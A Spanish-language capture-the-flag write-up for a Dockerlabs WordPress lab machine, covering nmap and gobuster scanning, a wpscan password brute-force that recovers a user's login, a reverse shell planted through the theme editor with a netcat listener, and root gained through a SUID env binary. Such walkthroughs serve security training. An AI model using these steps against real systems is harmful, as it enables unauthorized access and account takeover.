# Máquina Walking

---------------------

## Reconocimiento

Comenzamos realizando un escaneo con **nmap** para comprobar los puertos abiertos y sus respectivas versiones de la máquina objetivo.

```shell
┌──(miguel㉿miguel)-[~]
└─$ sudo nmap -p- -sC -sV -sS --min-rate 5000 -n -Pn 172.17.0.2         
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-18 21:05 CEST
Nmap scan report for 172.17.0.2
Host is up (0.0000020s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.82 seconds

```

Únicamente muestra abierto el puerto 80, por lo que procedemos a investigar su página web.

![image](https://github.com/miiguelpalaces/Machine-Upload-Dockerlabs-/assets/129620259/c2c5c2d0-d245-4bb1-be97-b64810c699a9)

Muestra la paǵina por defecto de Debian, por lo que decidimos buscar directorios ocultos dentro de la página web:

```shell
 ┌──(miguel㉿miguel)-[~]
└─$ gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,sh,py,jpeg   
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,sh,py,jpeg
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 10701]
/wordpress            (Status: 301) [Size: 312] [--> http://172.17.0.2/wordpress/]
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 1323360 / 1323366 (100.00%)
===============================================================
Finished
===============================================================
                               
```
Encontramos un subdirectorio de wordpress que procedemos a investigar encontrando la siguiente página.

![image](https://github.com/miiguelpalaces/Machine-Upload-Dockerlabs-/assets/129620259/1029d4c5-4e6c-4c61-9fe6-78f40b27f9eb)

Encontramos una pista que nos dice **web invulnerable** por lo que quiza podamos encontrar una vulnerabilidad en la web. Por lo que procedemos a enumerar la página mediante una herramienta para wordpress.

```shell
┌──(miguel㉿miguel)-[~]
└─$ wpscan --url http://172.17.0.2/wordpress --enumerate u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://172.17.0.2/wordpress/ [172.17.0.2]
[+] Started: Tue Jun 18 21:13:31 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.57 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://172.17.0.2/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://172.17.0.2/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://172.17.0.2/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://172.17.0.2/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.5.4 identified (Latest, released on 2024-06-05).
 | Found By: Rss Generator (Passive Detection)
 |  - http://172.17.0.2/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=6.5.4</generator>
 |  - http://172.17.0.2/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.5.4</generator>

[+] WordPress theme in use: twentytwentytwo
 | Location: http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/
 | Last Updated: 2024-04-02T00:00:00.000Z
 | Readme: http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/readme.txt
 | [!] The version is out of date, the latest version is 1.7
 | Style URL: http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/style.css?ver=1.6
 | Style Name: Twenty Twenty-Two
 | Style URI: https://wordpress.org/themes/twentytwentytwo/
 | Description: Built on a solidly designed foundation, Twenty Twenty-Two embraces the idea that everyone deserves a...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.6 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/style.css?ver=1.6, Match: 'Version: 1.6'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <======================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] mario
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://172.17.0.2/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Jun 18 21:13:33 2024
[+] Requests Done: 53
[+] Cached Requests: 6
[+] Data Sent: 14.14 KB
[+] Data Received: 264.294 KB
[+] Memory used: 198.652 MB
[+] Elapsed time: 00:00:02

```
A través de anterior comando, descubrimos diferentes vulnerabilidades en la página web. Además, desubrimos que uno de los usuarios es mario. 

## Explotación

Por lo que procedemos a realizar un ataque para descrubir la password del usuario mario.

```shell
┌──(miguel㉿miguel)-[~]
└─$ wpscan --url http://172.17.0.2/wordpress/ -U mario -P /usr/share/wordlists/rockyou.txt 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://172.17.0.2/wordpress/ [172.17.0.2]
[+] Started: Tue Jun 18 21:18:46 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.57 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://172.17.0.2/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://172.17.0.2/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://172.17.0.2/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://172.17.0.2/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.5.4 identified (Latest, released on 2024-06-05).
 | Found By: Rss Generator (Passive Detection)
 |  - http://172.17.0.2/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=6.5.4</generator>
 |  - http://172.17.0.2/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.5.4</generator>

[+] WordPress theme in use: twentytwentytwo
 | Location: http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/
 | Last Updated: 2024-04-02T00:00:00.000Z
 | Readme: http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/readme.txt
 | [!] The version is out of date, the latest version is 1.7
 | Style URL: http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/style.css?ver=1.6
 | Style Name: Twenty Twenty-Two
 | Style URI: https://wordpress.org/themes/twentytwentytwo/
 | Description: Built on a solidly designed foundation, Twenty Twenty-Two embraces the idea that everyone deserves a...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.6 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/style.css?ver=1.6, Match: 'Version: 1.6'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <=====================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - mario / love                                                                                            
Trying mario / catherine Time: 00:00:01 <                                   > (390 / 14344782)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: mario, Password: love

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Jun 18 21:18:51 2024
[+] Requests Done: 562
[+] Cached Requests: 5
[+] Data Sent: 256.485 KB
[+] Data Received: 462.469 KB
[+] Memory used: 293.465 MB
[+] Elapsed time: 00:00:05

```
Encontramos la password **love** e intentamos acceder al panel de control de la páquina web.

![image](https://github.com/miiguelpalaces/Machine-Upload-Dockerlabs-/assets/129620259/22c7c011-a118-41b2-9019-6ee33e54c4c3)

![image](https://github.com/miiguelpalaces/Machine-Upload-Dockerlabs-/assets/129620259/fc3d001c-fef2-40d7-89b7-c65761caa011)

Tras investigar la página web, descubrimos que en apariencias/theme code editor se encuentran diferentes archivos a partir de los cuales podemos crear una reverse shell.

![image](https://github.com/miiguelpalaces/Machine-Upload-Dockerlabs-/assets/129620259/5a21f32b-302f-4697-9ddb-1b95c7672278)

Por lo que procedemos a crear una reverse shell y a crear un puerto de escucha a través de la máquina atacante. 

![image](https://github.com/miiguelpalaces/Machine-Upload-Dockerlabs-/assets/129620259/705b4b21-985d-48b2-8d55-b27382f61b81)

Copiamos el código en el archivo index.thml.

![image](https://github.com/miiguelpalaces/Machine-Upload-Dockerlabs-/assets/129620259/9775af4f-e169-44e8-8952-f24a55510f36)

Actualizamos la dirección donde se encuentra el archivo para realizar la reverse shell y obtenemos dominio de la máquina como www-data.

![image](https://github.com/miiguelpalaces/Machine-Upload-Dockerlabs-/assets/129620259/64d94109-7fed-45ed-b217-807154d849ab)


## Escalada de privilegios 

Ahora realizamos la tty operativa para trabajar más cómodamente.

```shell
www-data@d571340fab84:/$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@d571340fab84:/$ ^Z   
zsh: suspended  nc -lvnp 5555

┌──(miguel㉿miguel)-[~]
└─$ stty raw -echo;fg
[1] + continued sudo nc -lvnp 5555

www-data@d571340fab84:/$ export TERM=xterm
www-data@d571340fab84:/$ export SHELL=bash

```
Buscamos que operaciones podemos realizar que nos permitan escalar privilegios a **root**.

```shell
www-data@d571340fab84:/$ find / -perm -4000
find: '/proc/tty/driver': Permission denied
.
.
.
.
find: '/var/cache/apt/archives/partial': Permission denied
find: '/var/lib/apt/lists/partial': Permission denied
find: '/var/lib/mysql/performance_schema': Permission denied
find: '/var/lib/mysql/mysql': Permission denied
find: '/var/lib/mysql/sys': Permission denied
find: '/var/lib/mysql/wordpress': Permission denied
find: '/var/lib/php/sessions': Permission denied
/usr/bin/umount
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/su
/usr/bin/chsh
/usr/bin/env
/usr/bin/chfn
/usr/bin/newgrp
find: '/usr/lib/mysql/plugin/auth_pam_tool_dir': Permission denied
find: '/root': Permission denied
find: '/etc/ssl/private': Permission denied

```
A través de la web **gtfobins** buscamos todas las opciones posibles para escalar privilegios.

![image](https://github.com/miiguelpalaces/Machine-Upload-Dockerlabs-/assets/129620259/4a280b00-41d0-4906-9420-2797bb717b6c)

![image](https://github.com/miiguelpalaces/Machine-Upload-Dockerlabs-/assets/129620259/e547fbd1-5a58-420c-b0e2-702c750b8a5d)

```shell
www-data@d571340fab84:/$ /usr/bin/env /bin/sh -p
# whoami
root
```













